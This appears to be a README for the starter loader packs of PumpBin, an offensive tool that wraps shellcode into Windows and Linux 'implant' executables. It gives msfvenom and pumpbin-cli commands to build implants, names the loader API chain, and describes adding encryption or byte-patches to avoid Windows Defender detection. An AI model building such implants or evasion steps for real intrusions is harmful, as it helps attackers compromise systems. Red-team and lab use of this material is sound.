# Starter plugins

Two ready-to-use `.b1n` loader packs for trying PumpBin with your own shellcode.

| File         | Target              | Loader technique                              | Size   |
|--------------|---------------------|-----------------------------------------------|--------|
| `linux.b1n`  | ELF, x86_64 Linux   | basic `mmap` + `mprotect` + jmp               | ~220 KB |
| `windows.b1n` | PE32+, x86_64 Win   | `VirtualAlloc` → `VirtualProtect` → `CreateThread` | ~150 KB |

Both are unencrypted, single-stage loaders. They are intentionally
simple — meant for smoke-testing the build pipeline and learning how
PumpBin stamps a `.b1n` against a shellcode, not for operational use
against modern EDR.

## Windows

```bash
# 1. Prepare a Windows x64 shellcode file.
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o payload.bin

# 2. Generate.
pumpbin-cli generate --pack examples/starter-plugins/windows.b1n --shellcode payload.bin -o out/implant.exe

# 3. Move it to a Windows host and run it. See "expected detection" below.
```

## Linux

```bash
# Put any Linux x64 shellcode at payload.bin.
pumpbin-cli generate --pack examples/starter-plugins/linux.b1n --shellcode payload.bin -o out/implant
chmod +x out/implant
./out/implant && echo "ran cleanly"
```

## Expected detection

These starter plugins are simple examples. The Windows one will be quarantined by Windows Defender for common payloads.

To add encryption, bake an encrypt module into a loader pack:

```bash
pumpbin-cli create-b1n --template loader.exe --output loader.b1n --encrypt-module aes-gcm
```

Or apply a post-build byte-patch during generation:

```bash
pumpbin-cli generate --pack loader.b1n --shellcode payload.bin \
    --post byte-patch:patches=4831d2:4833d2
```

See `book/` for the full module-chain documentation.

## Rebuilding the starter plugins

If you change the loader source and want to refresh the `.b1n`:

**Linux:**
```
pumpbin-cli create-b1n \
    --output examples/starter-plugins/linux.b1n \
    --template <your-linux-loader-elf>
```

**Windows:**
```
# Pre-req: mingw-w64 toolchain (`apt install gcc-mingw-w64`).
cd <path-to>/rust-shellcode/create_thread_pumpbin
cargo build --release --target x86_64-pc-windows-gnu
pumpbin-cli create-b1n \
    --output examples/starter-plugins/windows.b1n \
    --template target/x86_64-pc-windows-gnu/release/loader.exe
```
